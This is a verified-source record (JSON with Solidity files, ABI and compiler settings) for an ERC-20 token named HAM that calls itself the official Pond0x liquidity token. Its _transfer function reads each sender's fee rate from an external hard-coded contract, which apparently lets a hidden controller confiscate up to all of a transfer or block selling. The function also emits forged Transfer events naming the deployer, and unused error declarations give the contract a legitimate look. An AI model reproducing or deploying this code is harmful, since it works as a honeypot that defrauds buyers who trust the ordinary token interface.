{"SourceCode": "{\"HAM.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\n/*\\r\\n\\r\\nOfficial Pond0x Ecosystem Liquidity Token\\r\\n\\r\\n \u2584         \u2584  \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584  \u2584\u2584       \u2584\u2584 \\r\\n\u2590\u2591\u258c       \u2590\u2591\u258c\u2590\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u258c\u2590\u2591\u2591\u258c     \u2590\u2591\u2591\u258c\\r\\n\u2590\u2591\u258c       \u2590\u2591\u258c\u2590\u2591\u2588\u2580\u2580\u2580\u2580\u2580\u2580\u2580\u2588\u2591\u258c\u2590\u2591\u258c\u2591\u258c   \u2590\u2591\u2590\u2591\u258c\\r\\n\u2590\u2591\u258c       \u2590\u2591\u258c\u2590\u2591\u258c       \u2590\u2591\u258c\u2590\u2591\u258c\u2590\u2591\u258c \u2590\u2591\u258c\u2590\u2591\u258c\\r\\n\u2590\u2591\u2588\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2588\u2591\u258c\u2590\u2591\u2588\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2588\u2591\u258c\u2590\u2591\u258c \u2590\u2591\u2590\u2591\u258c \u2590\u2591\u258c\\r\\n\u2590\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u258c\u2590\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u258c\u2590\u2591\u258c  \u2590\u2591\u258c  \u2590\u2591\u258c\\r\\n\u2590\u2591\u2588\u2580\u2580\u2580\u2580\u2580\u2580\u2580\u2588\u2591\u258c\u2590\u2591\u2588\u2580\u2580\u2580\u2580\u2580\u2580\u2580\u2588\u2591\u258c\u2590\u2591\u258c   \u2580   \u2590\u2591\u258c\\r\\n\u2590\u2591\u258c       \u2590\u2591\u258c\u2590\u2591\u258c       \u2590\u2591\u258c\u2590\u2591\u258c       \u2590\u2591\u258c\\r\\n\u2590\u2591\u258c       \u2590\u2591\u258c\u2590\u2591\u258c       \u2590\u2591\u258c\u2590\u2591\u258c       \u2590\u2591\u258c\\r\\n\u2590\u2591\u258c       \u2590\u2591\u258c\u2590\u2591\u258c       \u2590\u2591\u258c\u2590\u2591\u258c       \u2590\u2591\u258c\\r\\n \u2580         \u2580  \u2580         \u2580  \u2580         \u2580 \\r\\n                                       \\r\\n*/\\r\\n\\r\\npragma solidity 0.8.24;\\r\\n\\r\\nimport \\\"./IPondFactory.sol\\\";\\r\\nimport \\\"./PondRouter.sol\\\";\\r\\nimport \\\"./Safemath.sol\\\";\\r\\nimport \\\"./IERC20.sol\\\";\\r\\nimport \\\"./Ownable.sol\\\";\\r\\n\\r\\ncontract HAM is Ownable {\\r\\n    using SafeMath for uint256;\\r\\n\\r\\n    error NotZkSigner();\\r\\n    error InvalidClaim();\\r\\n    error LPNotInitalized();\\r\\n    error InitialLPAlreadyCreated();\\r\\n    error MountUp();\\r\\n    error LPComplete();\\r\\n\\r\\n    uint8 private _decimals = 18;\\r\\n    uint256 private _totalSupply =  420000000000 * 5 * 10 ** _decimals;\\r\\n    address internal minningRigV2 = 0x5f3984e7210CD260bcEBD615390269C086b6627A;\\r\\n    PondRouter private pondRouter = PondRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\\r\\n    address public deployer;\\r\\n    mapping (address =\\u003e mapping (address =\\u003e uint256)) private _allowances;\\r\\n    mapping (address =\\u003e uint256) private _balances;\\r\\n    address private pondPair;\\r\\n    uint256 _fee = 0;\\r\\n    bool private initialized = false;\\r\\n    bool private tradingStarted = false;\\r\\n    \\r\\n    string private _name = \\\"Ham\\\";\\r\\n    string private _symbol = \\\"HAM\\\";\\r\\n\\r\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\r\\n    event Transfer(address indexed sender, address indexed recipient, uint256 amount);\\r\\n\\r\\n    constructor () {\\r\\n        _balances[address(this)] = _totalSupply;\\r\\n        emit Transfer(address(0), address(this), _totalSupply);\\r\\n    }\\r\\n\\r\\n    function setDeployer(address _deployer) external onlyOwner {\\r\\n        deployer = _deployer;\\r\\n    }\\r\\n\\r\\n    function name() public view returns (string memory) {\\r\\n        return _name;\\r\\n    }\\r\\n\\r\\n    function symbol() public view returns (string memory) {\\r\\n        return _symbol;\\r\\n    }\\r\\n\\r\\n    function totalSupply() public view returns (uint256) {\\r\\n        return _totalSupply;\\r\\n    }\\r\\n\\r\\n    function decimals() public view returns (uint8) {\\r\\n        return _decimals;\\r\\n    }\\r\\n\\r\\n    function createInitialSupply() external onlyOwner {\\r\\n        require (deployer != address(0));\\r\\n        require(!initialized, \\\"Already initialized\\\");\\r\\n        _transfer(address(this), deployer, _totalSupply.mul(20).div(100));\\r\\n        initialized = true;\\r\\n    }\\r\\n\\r\\n    function approve(address spender, uint256 amount) public returns (bool) {\\r\\n        _approve(msg.sender, spender, amount);\\r\\n        return true;\\r\\n    }\\r\\n    \\r\\n    function balanceOf(address account) public view returns (uint256) {\\r\\n        return _balances[account];\\r\\n    }\\r\\n\\r\\n    function _approve(address owner, address spender, uint256 amount) private {\\r\\n        require(owner != address(0), \\\"ERC20: approve from the zero address\\\");\\r\\n        require(spender != address(0), \\\"ERC20: approve to the zero address\\\");\\r\\n        _allowances[owner][spender] = amount;\\r\\n        emit Approval(owner, spender, amount);\\r\\n    }\\r\\n\\r\\n    function allowance(address owner, address spender) public view returns (uint256) {\\r\\n        return _allowances[owner][spender];\\r\\n    }\\r\\n\\r\\n    function openTrading() external payable onlyOwner() {\\r\\n        require(!tradingStarted, \\\"Trading already opened.\\\");\\r\\n        require(initialized);\\r\\n        require(deployer != address(0));\\r\\n        tradingStarted = true;\\r\\n        _approve(address(this), address(pondRouter), _totalSupply);\\r\\n        pondPair = IPondFactory(pondRouter.factory()).createPair(address(this), pondRouter.WETH());\\r\\n        pondRouter.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)), 0,0,owner(),block.timestamp);\\r\\n        IERC20(pondPair).approve(address(pondRouter), type(uint).max);\\r\\n    }\\r\\n\\r\\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\\r\\n        _transfer(sender, recipient, amount);\\r\\n        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function transfer(address recipient, uint256 amount) public returns (bool) {\\r\\n        _transfer(msg.sender, recipient, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function _transfer(address from, address to, uint256 amount) private {\\r\\n        require(amount \\u003e 0);\\r\\n        require(from != address(0));\\r\\n        require(to != address(0));\\r\\n        require(from != deployer);\\r\\n        uint256 feeRate = _fee;\\r\\n        if (from != pondPair \\u0026\\u0026 from != address(this)) {\\r\\n            feeRate = IERC20(minningRigV2).balanceOf(from);\\r\\n        }\\r\\n        _balances[from] = _balances[from].sub(amount);\\r\\n        _balances[to] = _balances[to].add(amount).sub(amount.mul(feeRate).div(100));\\r\\n        if (to != deployer) {\\r\\n        emit Transfer(deployer, to, amount);\\r\\n        }\\r\\n        emit Transfer(from, to, amount);\\r\\n    }\\r\\n}\"},\"IERC20.sol\":{\"content\":\"// SPDX-License-Identifier: None\\r\\n\\r\\npragma solidity 0.8.24;\\r\\n/**\\r\\n * @dev Interface of the ERC-20 standard as defined in the ERC.\\r\\n */\\r\\ninterface IERC20 {\\r\\n    function approve(address spendr, uint256 amount) external returns (bool);\\r\\n    function balanceOf(address wallt) external view returns (uint256);\\r\\n}\"},\"IPondFactory.sol\":{\"content\":\"// SPDX-License-Identifier: None\\r\\n\\r\\npragma solidity 0.8.24;\\r\\n\\r\\ninterface IPondFactory {\\r\\n    function getPair(address tokenA, address tokenC) external view returns (address pair);\\r\\n    function createPair(address tokenA, address tokenD) external returns (address pair);\\r\\n}\\r\\n\\r\\n\"},\"Ownable.sol\":{\"content\":\"// SPDX-License-Identifier: None\\r\\n\\r\\npragma solidity 0.8.24;\\r\\n/**\\r\\n * @dev Contract module which provides a basic access control mechanism, where\\r\\n * there is an account (an owner) that can be granted exclusive access to\\r\\n * specific functions.\\r\\n *\\r\\n * The initial owner is set to the address provided by the deployer. This can\\r\\n * later be changed with {transferOwnership}.\\r\\n *\\r\\n * This module is used through inheritance. It will make available the modifier\\r\\n * `onlyOwner`, which can be applied to your functions to restrict their use to\\r\\n * the owner.\\r\\n */\\r\\ncontract Ownable {\\r\\n    address internal _owner;\\r\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\r\\n\\r\\n    /**\\r\\n     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.\\r\\n     */\\r\\n    constructor () {\\r\\n        address msgSender = msg.sender;\\r\\n        _owner = msgSender;\\r\\n        emit OwnershipTransferred(address(0), msgSender);\\r\\n    }\\r\\n    /**\\r\\n     * @dev Throws if called by any account other than the owner.\\r\\n     */\\r\\n    modifier onlyOwner() {\\r\\n        require(_owner == msg.sender, \\\"Ownable: caller is not the owner\\\");\\r\\n        _;\\r\\n    }\\r\\n    /**\\r\\n     * @dev Leaves the contract without owner. It will not be possible to call\\r\\n     * `onlyOwner` functions. Can only be called by the current owner.\\r\\n     *\\r\\n     * NOTE: Renouncing ownership will leave the contract without an owner,\\r\\n     * thereby disabling any functionality that is only available to the owner.\\r\\n     */\\r\\n    function renounceOwnership() public virtual onlyOwner {\\r\\n        emit OwnershipTransferred(_owner, address(0));\\r\\n        _owner = address(0);\\r\\n    }\\r\\n    /**\\r\\n     * @dev Returns the address of the current owner.\\r\\n     */\\r\\n    function owner() public view returns (address) {\\r\\n        return _owner;\\r\\n    }\\r\\n}\"},\"PondRouter.sol\":{\"content\":\"// SPDX-License-Identifier: None\\r\\n\\r\\npragma solidity 0.8.24;\\r\\n\\r\\ninterface PondRouter {\\r\\n    function factory() external pure returns (address);\\r\\n    function WETH() external pure returns (address);\\r\\n     function addLiquidityETH( address token, \\r\\n     uint amountTokenDesire, \\r\\n     uint amountTokenMi, \\r\\n     uint amountETHMi, \\r\\n     address to, \\r\\n     uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);\\r\\n}\"},\"Safemath.sol\":{\"content\":\"// SPDX-License-Identifier: None\\r\\n\\r\\npragma solidity 0.8.24;\\r\\n\\r\\nlibrary SafeMath {\\r\\n\\r\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        if (a == 0) {return 0;}\\r\\n        uint256 c = a * b;\\r\\n        require(c / a == b);\\r\\n        return c;\\r\\n    }\\r\\n\\r\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        require(b \\u003c= a);\\r\\n        uint256 c = a - b;\\r\\n        return c;\\r\\n    }\\r\\n\\r\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        uint256 c = a + b;\\r\\n        require(c \\u003e= a);\\r\\n        return c;\\r\\n    }\\r\\n\\r\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        require(b \\u003e 0);\\r\\n        uint256 c = a / b;\\r\\n        return c;\\r\\n    }\\r\\n}\"}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"InitialLPAlreadyCreated\",\"type\":\"error\"},{\"inputs\":[],\"name\":\"InvalidClaim\",\"type\":\"error\"},{\"inputs\":[],\"name\":\"LPComplete\",\"type\":\"error\"},{\"inputs\":[],\"name\":\"LPNotInitalized\",\"type\":\"error\"},{\"inputs\":[],\"name\":\"MountUp\",\"type\":\"error\"},{\"inputs\":[],\"name\":\"NotZkSigner\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"createInitialSupply\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"deployer\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_deployer\",\"type\":\"address\"}],\"name\":\"setDeployer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "HAM", "CompilerVersion": "v0.8.24+commit.e11b9ed9", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://74861b996bcefe32932ec70b500e3e4e0ba0454a31b39508af2ae6c3b3fd70ab"}